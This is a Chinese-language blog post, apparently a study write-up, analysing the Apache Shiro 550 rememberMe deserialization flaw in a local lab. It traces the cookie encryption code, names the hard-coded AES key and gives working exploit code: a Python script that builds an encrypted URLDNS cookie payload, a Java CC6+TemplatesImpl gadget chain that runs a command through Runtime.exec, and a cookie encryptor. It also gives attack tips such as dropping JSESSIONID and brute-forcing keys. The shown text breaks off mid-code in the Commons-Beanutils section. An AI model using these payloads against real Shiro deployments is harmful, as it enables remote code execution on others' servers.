title="Shiro反序列化的特征"></a>Shiro反序列化的特征</h3><p>返回包中会包含rememberMe=deleteMe字段</p><p>这种情况大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，这个是在返回包中(Response)</p><p>如果返回的数据包中没有remeberMe=deleteMe字段的话，可以在数据包中的Cookie中添加remeberMe=deleteMe字段这样也会在返回包中有这个字段</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里用的P神给的环境 ：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ul><li>JDK 8u65</li><li>Tomcat 9</li><li>Shiro 1.2.4</li><li>Commons Collection 3.2.1</li></ul><p>先把p神的项目下载下来</p><p><img src="../images/image-20230619172524775.png" alt="image-20230619172524775"></p><p>然后用<code>idea</code>打开<code>shirodemo</code></p><p><img src="../images/image-20230619172551611.png" alt="image-20230619172551611"></p><p>接着就是配置<code>tomacat</code>了</p><p><img src="../images/image-20230619172643791.png" alt="image-20230619172643791"></p><p>先去官网把他下载下来</p><p>然后进入idea打开设置</p><p><img src="../images/image-20230619172728851.png" alt="image-20230619172728851"></p><p><img src="../images/image-20230619172749282.png" alt="image-20230619172749282"></p><p>添加tomacat的路径</p><p><img src="../images/image-20230619172816282.png" alt="image-20230619172816282"></p><p>接着点击这个</p><p><img src="../images/image-20230619172838144.png" alt="image-20230619172838144"></p><p>先配置这个</p><p><img src="../images/image-20230619172854359.png" alt="image-20230619172854359"></p><p>最后就完成了</p><p><img src="../images/image-20230619172911210.png" alt="image-20230619172911210"></p><h3 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h3><p>先抓个包看看  </p><p>默认账号密码</p><ul><li>root</li><li>secret</li></ul><p><strong>(重点是得勾选这个<code>remember me</code>)</strong></p><p><img src="../images/image-20230619173801606.png" alt="image-20230619173801606"></p><p><strong>固定会返回这个<code>rememberMe=deleteMe</code></strong></p><p>并且这个<code>cookie</code>很长(<strong>这就说明了这个cookie存着一些信息</strong>)</p><p>我们就去代码里找一下看这个<code>cookie</code>是怎么生成的</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p><strong>在登录成功后会对cookie进行编码加密 ，我们来跟一下这个加密流程</strong></p><p>入口是在 <code>AbstractRememberMeManager.onSuccessfulLogin</code> 方法</p><p><img src="../images/image-20230619175908159.png" alt="image-20230619175908159"></p><p>判断 token 是否为 true，然后调用 <code>rememberIdentity</code>：</p><p><img src="../images/image-20230619180002676.png" alt="image-20230619180002676"></p><p>看一下这个 <code>getIdentityToRemember</code>：</p><p><img src="../images/image-20230619180033277.png" alt="image-20230619180033277"></p><p>大致就是获取用户名赋值给 <code>principals</code>。</p><p>回到<code>rememberIdentity</code>跟进<code>this.rememberIdentity(subject, principals)</code>：</p><p><img src="../images/image-20230619180132520.png" alt="image-20230619180132520"></p><p>跟进 <code>convertPrincipalsToBytes</code> 看看：</p><p><img src="../images/image-20230619180150004.png" alt="image-20230619180150004"></p><p>先对用户名进行序列化处理，然后调用了个<code>this.getCipherService()</code>方法是否有返回值，跟进查看：</p><p><img src="../images/image-20230619180226872.png" alt="image-20230619180226872"></p><p>返回了一种 AES 的加密方式CBC。</p><p>回到<code>convertPrincipalsToBytes</code>方法，接着调用<code>this.encrypt(bytes)</code>对序列化后的用户名进行加密操作，跟进：</p><p><img src="../images/image-20230619180301097.png" alt="image-20230619180301097"></p><p>这里同样是先用<code>getCipherService</code>方法获取一个加密方式，如果不是空则用该加密方式调用<code>encrypt</code>方法进行加密，AES加密是个对称加密需要密钥，所以这里用<code>getEncryptionCipherKey</code>获取一个密钥，跟进看看：</p><p><img src="../images/image-20230619180347089.png" alt="image-20230619180347089"></p><p>看来是直接返回了这个密钥，由于我们知道这个漏洞就是因为密钥是硬编码写好的造成的，所以我们往回找找这个密钥是哪里赋值的。</p><p>找到这个AbstractRememberMeManager类初始化的时候会，调用<code>setCipherKey</code>方法来设置密钥：</p><p><img src="../images/image-20230619180422223.png" alt="image-20230619180422223"></p><p>跟进<code>setCipherKey</code>方法瞧一眼：</p><p><strong><img src="../images/image-20230619180444210.png" alt="image-20230619180444210"></strong></p><p>正如上面说的AES是对称加密，加密和解密的密钥是同一个，这里就是用传进来的密钥分别赋值给加密密钥和解密密钥，跟进<code>setEncryptionCipherKey</code>：</p><p><img src="../images/image-20230619180515710.png" alt="image-20230619180515710"></p><p>这里就是直接赋值了（吐槽下，真套呀，不过还能看得懂，没套晕）</p><p>回到AbstractRememberMeManager类初始化的<code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code>这里，这里传入的静态变量DEFAULT_CIPHER_KEY_BYTES实在类定义里面写好的：</p><p><img src="../images/image-20230619180524282.png" alt="image-20230619180524282"></p><p>就是说这个 <code>encryptionCipherKey</code> 是 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 的解密，是一个常量 就是说让用户名的序列化和一个常量进入 <code>cipherService.encrypt</code> 进行加密：</p><p><img src="../images/image-20230619180616452.png" alt="image-20230619180616452"></p><p>具体加密就不看了，不懂密码学。</p><p>总之对学列化后的用户名进行AES加密之后会返回字节到<code>rememberIdentity</code>方法：</p><p><img src="../images/image-20230619180706415.png" alt="image-20230619180706415"></p><p>进入下一步的<code>rememberSerializedIdentity</code>方法：</p><p><img src="../images/image-20230619181422498.png" alt="image-20230619181422498"></p><p>刚才都还是在AbstractRememberMeManager类里面调用，这时候就来到了CookieRememberMeManager类里面，看类名大概能猜到是处理cookie的了。</p><p>这里逻辑就是对传进来的字节进行base64加密，然后设置为名字为rememberMe的cookie值。(<strong>根据这个函数名得知，这里是会对cookie进行序列化处理的</strong>)</p><h3 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h3><p>现在我们从<code>getRememberedIdentity</code>开始分析，文件位置 <code>org/apache/shiro/mgt/DefaultSecurityManager.java</code></p><p><img src="../images/image-20230619182115535.png" alt="image-20230619182115535"></p><p>跟进到<code>getRememberedPrincipals</code>：</p><p><img src="../images/image-20230619182143104.png" alt="image-20230619182143104"></p><p>继续跟到<code>getRememberedSerializedIdentity</code>：</p><p><img src="../images/image-20230619182230245.png" alt="image-20230619182230245"></p><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>返回 <code>getRememberedPrincipals</code>方法，下一步跟进 <code>convertBytesToPrincipals</code>方法：</p><p><img src="../images/image-20230619182456872.png" alt="image-20230619182456872"></p><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>。解密就是和加密的逆过程，不多说，进入 <code>deserialize</code>：</p><p><img src="../images/image-20230619182549894.png" alt="image-20230619182549894"></p><p>继续跟进套娃的<code>deserialize</code>：</p><p><img src="../images/image-20230619182713824.png" alt="image-20230619182713824"></p><p>发现<code>readObject</code>方法出现了，下面就可以愉快地进行反序列化了！</p><p><strong>加密解密跟解密都跟完了</strong>  </p><p>(<strong>如果我们能根据这个固定密钥来伪造cookie的话，这样的话就可以进行恶意操作了</strong>)</p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？文章<a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>因此我们需要构造payload<strong>排除类型转换错误</strong>，进而准确判断密钥。</p><p>shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p><a href="https://www.cnblogs.com/zpchcbd/p/15092263.html">可测试key是否正确</a></p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>通过漏洞原理可以知道，构造Payload需要将利用链通过AES加密后在base64编码。将Payload的值设置为rememberMe的cookie值，这里借助ysoserial中的URLDNS链去打，<strong>由于URLDNS不依赖于Commons Collections包，只需要JDK的包就行，所有一半用于检测是否存在漏洞</strong>。</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">r&#x27;D:\Program Files\Java\jdk1.8.0_301\bin\java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">r&#x27;F:\CTF资料\CTF工具\ysoserial\target\ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog</span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://dq6w3y.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>将得到的payload用Burp传入rememberMe的cookie值中：</p><p><strong>当存在 JSESSIONID 时，会忽略 rememberMe，所以在攻击时需要将 JSESSIONID 删掉</strong></p><p><img src="../images/image-20230619201344721.png" alt="image-20230619201344721"></p><p><img src="../images/image-20230619201350611.png" alt="image-20230619201350611"></p><p>成功</p><h3 id="CC6-TemplatesImpl链"><a href="#CC6-TemplatesImpl链" class="headerlink" title="CC6+TemplatesImpl链"></a>CC6+TemplatesImpl链</h3><p>但是仅仅是URLDNS是不够的，我们想要的是执行恶意代码，所以先引入Commons Collections 3.2.1 包来进行利用构造。</p><p>(<strong>这里用常规的<code>cc6</code>链子是打不通的，用了话会报错，导致无法执行</strong>)<br>(<strong>就是反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>)</p><p><strong>我们就得去找cc中还有没有没用数组的来替换cc6中使用数组的部分</strong></p><p>这里感兴趣为啥的话可以看看 <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p><img src="../images/20220503212131.png" alt="img"></p><p><strong>这次用这张图片   觉得写的不错</strong></p><p>我们不难发现实际上CC4和CC2是没有用到Transformer数组的，但CC4依赖的是Commons Collections4这个包，当前环境无法使用这条链，拿还有啥方法呢？</p><p>我们可以尝试去改造CC6这条链的后半部分，在CC6链中，我们用到了一个类， <code>TiedMapEntry</code> ，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。TiedMapEntry 类有个 <code>getValue</code> 方法，调用了map的get方法，并传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就是这个<strong>key</strong></p><p>当这个map是<code>LazyMap</code>时，其get方法就是触发<code>transform</code>的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 <code>LazyMap#get</code> 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p><p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个 <code>LazyMap#get</code> 的参数key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p><p>我们<code>LazyMap.get(key)</code>直接调用<code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用<code>TempalteImpl.newTransformer()</code>来完成后续调用。</p><p><img src="../images/20220503224146.png" alt="img"></p><p><strong>最终exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fileNmae, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fileNmae);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC.CC3</span></span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_name&quot;, &quot;aaaaa&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\VulTest\\CC\\target\\classes\\Shiro\\EvilTemplatesImpl.class&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC2</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC.CC6</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将生成的<code>ser.bin</code>用加密脚本给进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"> </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Shiro550Client</span> &#123;</span><br><span class="line">    public static void main(String []args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;E:\\Coding\\Java\\VulTest\\CC\\ser.bin&quot;</span>));</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>然后再将生成的编码进行<code>cookie</code>传参</strong></p><p><img src="../images/image-20230619205759940.png" alt="image-20230619205759940"></p><h3 id="Commons-Beanutils1链"><a href="#Commons-Beanutils1链" class="headerlink" title="Commons-Beanutils1链"></a>Commons-Beanutils1链</h3><p>上面的CC6+TemplatesImpl链是依赖于Commmons Collections软件包的，如果项目中没有用到的话就无法实现代码执行，那有没有只用Shiro自己的类就能实现代码执行的链呢？答案是有的。这里用到了Apache Commons Beanutils包。</p><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。</p><p>这里的话我也写了一篇文章来说分析这个cb链   <a href="https://ke1nys.github.io/posts/f52590e9.html">java-Commons-BeanUtils</a></p><p><strong>简单来说就是这个链子可以任意进行getter操作</strong></p><p>如何利用这个<code>PropertyUtils.getProperty()</code>方法去构造我们的利用链呢？回顾CC链中没有用到Commons Collections包的部分，再次搬出这张图</p><p><img src="../images/20220504154547.png" alt="img"></p><p>其中红框的部分就是没有用到Commons Collections包的部分，如此一来，CC3中的TemplatesImpl实现类加载任意代码执行是跑不掉的，所以我们要找找那里能调用<code>TemplatesImpl.newTransformer()</code>方法，然后我们找到了<code>TemplatesImpl.getOutputProperties()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   